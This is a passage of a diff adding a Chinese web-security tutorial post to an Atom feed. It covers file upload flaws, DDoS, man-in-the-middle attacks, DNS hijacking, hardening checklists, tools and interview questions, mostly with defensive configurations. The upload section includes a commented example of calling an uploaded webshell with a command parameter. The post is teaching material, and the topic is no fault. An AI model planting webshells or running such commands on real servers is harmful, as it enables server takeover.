class=&#34;keyword&#34;&gt;if&lt;/span&gt; parsed.scheme &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; [&lt;span class=&#34;string&#34;&gt;&amp;#x27;http&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;https&amp;#x27;&lt;/span&gt;]:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;raise&lt;/span&gt; ValueError(&lt;span class=&#34;string&#34;&gt;&amp;quot;不支持的协议&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; requests.get(url, timeout=&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;hr&gt;
+&lt;h3 id=&#34;2-5-文件上传漏洞&#34;&gt;&lt;a href=&#34;#2-5-文件上传漏洞&#34; class=&#34;headerlink&#34; title=&#34;2.5 文件上传漏洞&#34;&gt;&lt;/a&gt;2.5 文件上传漏洞&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;原理：&lt;/strong&gt; 应用允许用户上传文件但校验不严，攻击者上传 WebShell、恶意脚本等。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;攻击示例：&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 上传 jsp/php webshell 到服务器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 访问 http://target.com/uploads/shell.jsp?cmd=whoami&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 服务器执行命令，完全沦陷&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;防御手段：&lt;/strong&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;措施&lt;/th&gt;
+&lt;th&gt;说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;后缀白名单&lt;/td&gt;
+&lt;td&gt;只允许 &lt;code&gt;.jpg .png .pdf&lt;/code&gt; 等，拒绝 &lt;code&gt;.jsp .php .exe&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;MIME 类型校验&lt;/td&gt;
+&lt;td&gt;检查 &lt;code&gt;Content-Type&lt;/code&gt; 头&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;文件内容校验&lt;/td&gt;
+&lt;td&gt;读取文件头魔术数字&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;上传目录不可执行&lt;/td&gt;
+&lt;td&gt;移除执行权限&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;随机重命名&lt;/td&gt;
+&lt;td&gt;防止文件名猜测和路径遍历&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;三、网络层攻击&#34;&gt;&lt;a href=&#34;#三、网络层攻击&#34; class=&#34;headerlink&#34; title=&#34;三、网络层攻击&#34;&gt;&lt;/a&gt;三、网络层攻击&lt;/h2&gt;&lt;h3 id=&#34;3-1-DDoS-分布式拒绝服务-Distributed-Denial-of-Service&#34;&gt;&lt;a href=&#34;#3-1-DDoS-分布式拒绝服务-Distributed-Denial-of-Service&#34; class=&#34;headerlink&#34; title=&#34;3.1 DDoS 分布式拒绝服务 (Distributed Denial of Service)&#34;&gt;&lt;/a&gt;3.1 DDoS 分布式拒绝服务 (Distributed Denial of Service)&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;原理：&lt;/strong&gt; 利用大量僵尸主机同时向目标发送请求，耗尽带宽、CPU 或连接数，导致正常用户无法访问。&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;flowchart TD&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    A[攻击者 C&amp;amp;C] --&amp;gt; B1[僵尸主机 1]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    A --&amp;gt; B2[僵尸主机 2]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    A --&amp;gt; B3[僵尸主机 ...N]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    B1 --&amp;gt; C[目标服务器]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    B2 --&amp;gt; C&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    B3 --&amp;gt; C&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    C --&amp;gt; D[资源耗尽&amp;lt;br/&amp;gt;服务瘫痪]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;常见 DDoS 类型：&lt;/strong&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;类型&lt;/th&gt;
+&lt;th&gt;攻击层&lt;/th&gt;
+&lt;th&gt;原理&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;SYN Flood&lt;/td&gt;
+&lt;td&gt;L4 传输层&lt;/td&gt;
+&lt;td&gt;发送大量 SYN 包不完成三次握手&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;UDP Flood&lt;/td&gt;
+&lt;td&gt;L4 传输层&lt;/td&gt;
+&lt;td&gt;大量 UDP 包淹没目标带宽&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;HTTP Flood&lt;/td&gt;
+&lt;td&gt;L7 应用层&lt;/td&gt;
+&lt;td&gt;模拟正常 HTTP 请求攻击应用&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;DNS Amplification&lt;/td&gt;
+&lt;td&gt;L4→反射&lt;/td&gt;
+&lt;td&gt;利用 DNS 开放解析器放大流量&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;p&gt;&lt;strong&gt;防御手段：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;CDN &amp;#x2F; 云清洗&lt;/strong&gt;：Cloudflare、阿里云 WAF、AWS Shield&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;速率限制&lt;/strong&gt;：Nginx &lt;code&gt;limit_req&lt;/code&gt;、&lt;code&gt;limit_conn&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;SYN Cookie&lt;/strong&gt;：防止半连接队列耗尽&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;IP 黑&amp;#x2F;白名单&lt;/strong&gt;：封禁异常 IP&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Anycast 网络&lt;/strong&gt;：分散流量到多个数据中心&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight nginx&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# Nginx 速率限制示例&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;limit_req_zone&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$binary_remote_addr&lt;/span&gt; zone=one:&lt;span class=&#34;number&#34;&gt;10m&lt;/span&gt; rate=30r/s;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;section&#34;&gt;server&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;section&#34;&gt;location&lt;/span&gt; /api/ &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;attribute&#34;&gt;limit_req&lt;/span&gt; zone=one burst=&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt; nodelay;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;attribute&#34;&gt;proxy_pass&lt;/span&gt; http://backend;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;hr&gt;
+&lt;h3 id=&#34;3-2-中间人攻击-MITM-Man-in-the-Middle&#34;&gt;&lt;a href=&#34;#3-2-中间人攻击-MITM-Man-in-the-Middle&#34; class=&#34;headerlink&#34; title=&#34;3.2 中间人攻击 MITM (Man-in-the-Middle)&#34;&gt;&lt;/a&gt;3.2 中间人攻击 MITM (Man-in-the-Middle)&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;原理：&lt;/strong&gt; 攻击者拦截并篡改通信双方的数据，常见于公共 Wi-Fi、ARP 欺骗等场景。&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sequenceDiagram&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    participant U as 用户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    participant M as 攻击者(中间人)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    participant S as 服务器&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    U-&amp;gt;&amp;gt;M: 我是用户，我要访问服务器&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    M-&amp;gt;&amp;gt;S: 我是用户（假冒）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    S-&amp;gt;&amp;gt;M: 响应数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    M-&amp;gt;&amp;gt;U: 篡改后的数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Note over M: 攻击者可读取/修改&amp;lt;br/&amp;gt;全部通信内容！&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;防御手段：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;HTTPS&lt;/strong&gt;：全站启用 TLS，证书验证&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;HSTS&lt;/strong&gt;：强制浏览器使用 HTTPS&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;证书固定&lt;/strong&gt;：Pin 证书公钥，防止伪造证书&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;避免公共 Wi-Fi&lt;/strong&gt;：使用 VPN 加密隧道&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight nginx&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# Nginx HSTS 配置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;add_header&lt;/span&gt; Strict-Transport-Security &lt;span class=&#34;string&#34;&gt;&amp;quot;max-age=63072000; includeSubDomains; preload&amp;quot;&lt;/span&gt; always;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;hr&gt;
+&lt;h3 id=&#34;3-3-DNS-劫持&#34;&gt;&lt;a href=&#34;#3-3-DNS-劫持&#34; class=&#34;headerlink&#34; title=&#34;3.3 DNS 劫持&#34;&gt;&lt;/a&gt;3.3 DNS 劫持&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;原理：&lt;/strong&gt; 篡改 DNS 解析结果，将用户引导到钓鱼网站。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;防御手段：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;DNSSEC&lt;/strong&gt;：DNS 签名验证&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;DoH &amp;#x2F; DoT&lt;/strong&gt;：DNS over HTTPS&amp;#x2F;TLS，加密 DNS 查询&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;使用可信 DNS&lt;/strong&gt;：&lt;code&gt;1.1.1.1&lt;/code&gt; (Cloudflare)、&lt;code&gt;8.8.8.8&lt;/code&gt; (Google)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;四、安全加固最佳实践清单&#34;&gt;&lt;a href=&#34;#四、安全加固最佳实践清单&#34; class=&#34;headerlink&#34; title=&#34;四、安全加固最佳实践清单&#34;&gt;&lt;/a&gt;四、安全加固最佳实践清单&lt;/h2&gt;&lt;h3 id=&#34;4-1-开发阶段&#34;&gt;&lt;a href=&#34;#4-1-开发阶段&#34; class=&#34;headerlink&#34; title=&#34;4.1 开发阶段&#34;&gt;&lt;/a&gt;4.1 开发阶段&lt;/h3&gt;&lt;figure class=&#34;highlight markdown&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[✅] 所有 SQL 使用参数化查询&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[✅] 输出内容进行 HTML 编码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[✅] 敏感操作加 CSRF Token&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[✅] 密码使用 bcrypt / argon2 哈希存储&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[✅] 用户上传文件做白名单校验&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[✅] 禁用 DEBUG 模式（不要泄漏堆栈信息）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[✅] 使用 HTTPS，设置 HSTS&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[✅] 设置 HttpOnly + Secure + SameSite Cookie&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[✅] 添加 CSP 响应头&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[✅] API 接口做限流防刷&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;4-2-运维阶段&#34;&gt;&lt;a href=&#34;#4-2-运维阶段&#34; class=&#34;headerlink&#34; title=&#34;4.2 运维阶段&#34;&gt;&lt;/a&gt;4.2 运维阶段&lt;/h3&gt;&lt;figure class=&#34;highlight markdown&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[✅] 服务器端口最小化开放（只开 80/443/SSH）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[✅] SSH 禁用密码登录，使用密钥&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[✅] 定期更新系统 + 软件包（CVE 修复）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[✅] 数据库不对外开放，只监听内网&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[✅] 日志集中管理 + 异常告警&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[✅] 定期备份数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[✅] 网络隔离：生产/测试/开发环境分离&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[✅] 配置 WAF + 入侵检测系统 IDS/IPS&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[✅] 最小权限原则：每个服务只给必要权限&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[✅] 运行 Docker 容器时不使用 root&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;4-3-安全工具栈&#34;&gt;&lt;a href=&#34;#4-3-安全工具栈&#34; class=&#34;headerlink&#34; title=&#34;4.3 安全工具栈&#34;&gt;&lt;/a&gt;4.3 安全工具栈&lt;/h3&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;工具&lt;/th&gt;
+&lt;th&gt;用途&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;OWASP ZAP &amp;#x2F; Burp Suite&lt;/td&gt;
+&lt;td&gt;Web 漏洞扫描与渗透测试&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Nmap&lt;/td&gt;
+&lt;td&gt;端口扫描与网络发现&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Wireshark&lt;/td&gt;
+&lt;td&gt;流量抓包分析&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Metasploit&lt;/td&gt;
+&lt;td&gt;渗透测试框架&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ClamAV&lt;/td&gt;
+&lt;td&gt;防病毒扫描&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Fail2ban&lt;/td&gt;
+&lt;td&gt;暴力破解防护&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;OpenVAS&lt;/td&gt;
+&lt;td&gt;漏洞扫描器&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Trivy &amp;#x2F; Snyk&lt;/td&gt;
+&lt;td&gt;容器镜像安全扫描&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;五、攻防演练流程&#34;&gt;&lt;a href=&#34;#五、攻防演练流程&#34; class=&#34;headerlink&#34; title=&#34;五、攻防演练流程&#34;&gt;&lt;/a&gt;五、攻防演练流程&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;flowchart LR&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    A[信息收集] --&amp;gt; B[漏洞扫描]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    B --&amp;gt; C[漏洞利用]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    C --&amp;gt; D[权限提升]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    D --&amp;gt; E[横向移动]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    E --&amp;gt; F[数据窃取/后门植入]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    G[Honeypot 蜜罐] -.-&amp;gt; A&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    H[WAF/IDS] -.-&amp;gt; B&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    I[最小权限 RABC] -.-&amp;gt; D&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    J[网络微隔离] -.-&amp;gt; E&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    K[DLP 数据防泄漏] -.-&amp;gt; F&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;蓝方（防守方）的每层防御，都对应红方（攻击方）的每一步。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;六、常见面试题&#34;&gt;&lt;a href=&#34;#六、常见面试题&#34; class=&#34;headerlink&#34; title=&#34;六、常见面试题&#34;&gt;&lt;/a&gt;六、常见面试题&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Q1：SQL 注入怎么防御？&lt;/strong&gt;&lt;br&gt;A：核心是参数化查询，辅助是输入校验 + 最小权限 + WAF。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Q2：XSS 和 CSRF 的区别？&lt;/strong&gt;&lt;br&gt;A：XSS 是信任用户输入导致的脚本注入，CSRF 是信任用户浏览器导致的请求伪造。XSS 可以窃取 CSRF Token，所以先防 XSS 再防 CSRF。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Q3：HTTPS 能防哪些攻击？&lt;/strong&gt;&lt;br&gt;A：防中间人窃听&amp;#x2F;篡改、防 DNS 劫持（结合 HSTS）。防不了 DDoS、业务逻辑漏洞、XSS。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Q4：什么是纵深防御？&lt;/strong&gt;&lt;br&gt;A：多层防御体系——即使某一层被攻破，后续层仍然能拦截。如 WAF → API 校验 → 数据库权限 → 加密存储。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Q5：如果服务器已经被入侵怎么办？&lt;/strong&gt;&lt;br&gt;A：①立即断网隔离 → ②保留现场证据 → ③排查入侵路径 → ④重装系统恢复 → ⑤修补漏洞 → ⑥复盘改进。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;七、推荐资源&#34;&gt;&lt;a href=&#34;#七、推荐资源&#34; class=&#34;headerlink&#34; title=&#34;七、推荐资源&#34;&gt;&lt;/a&gt;七、推荐资源&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;OWASP Top 10&lt;/strong&gt;：&lt;a href=&#34;https://owasp.org/www-project-top-ten/&#34;&gt;https://owasp.org/www-project-top-ten/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;PortSwigger Web Security Academy&lt;/strong&gt;：在线攻防实验室&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;HackTheBox &amp;#x2F; TryHackMe&lt;/strong&gt;：实战渗透平台&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;《白帽子讲 Web 安全》&lt;/strong&gt;（吴翰清）— 国内经典入门书&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;《Web 安全攻防：渗透测试实战指南》&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Kali Linux&lt;/strong&gt;：渗透测试专用系统&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;CVE 漏洞库&lt;/strong&gt;：&lt;a href=&#34;https://cve.mitre.org/&#34;&gt;https://cve.mitre.org/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;记住：&lt;/strong&gt; 安全不是一次性配置，而是一个持续的过程。保持学习，关注新的 CVE 漏洞，定期做安全审计，才能让你的系统更健壮 💪&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+        <category term="网络安全" />
+        <category term="SQL注入" />
+        <category term="XSS" />
+        <category term="CSRF" />
+        <category term="DDoS" />
+        <category term="渗透测试" />
+        <updated>2026-05-08T14:10:00.000Z</updated>
+    </entry>
+</feed>
